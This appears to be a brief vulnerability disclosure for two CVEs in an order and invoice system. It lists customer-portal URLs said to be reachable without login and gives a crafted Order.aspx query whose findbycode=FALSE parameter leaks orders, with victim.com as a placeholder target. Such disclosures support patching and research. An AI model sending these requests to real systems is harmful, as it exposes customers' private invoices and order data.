## Insights PoC - CVE-2023-45892

Invoices and Orders are accessible unauthenticated

https://insight.victim.com/invoice.aspx?id=1
https://insight.victim.com/order.aspx?id=1

## Customer Portal PoC - CVE-2023-45893

The following are accessible unauthenticated

* https://customerportal.victim.com/order.aspx
* https://customerportal.victim.com/ratings.aspx
* https://customerportal.victim.com/invoice.aspx
* https://customerportal.victim.com/passwordrecovery.aspx
* https://customerportal.victim.com/statement.aspx
* https://customerportal.victim.com/order.aspx
* https://customerportal.victim.comm/ratings.aspx
* https://customerportal.victim.com/invoice.aspx
* https://customerportal.victim.com/passwordrecovery.aspx
* https://customerportal.victim.com/statement.aspx

To leak orders, for example, you may need to play with the parameters. replace CITYNAME with the server it's hosted in; if you know. findbycode=false is the the thing allows orders to be leaked here.

`Order.aspx?Id=1&lserver=<CITYNAME>&findbycode=FALSE&pcode=37374&pname=USERNAME`
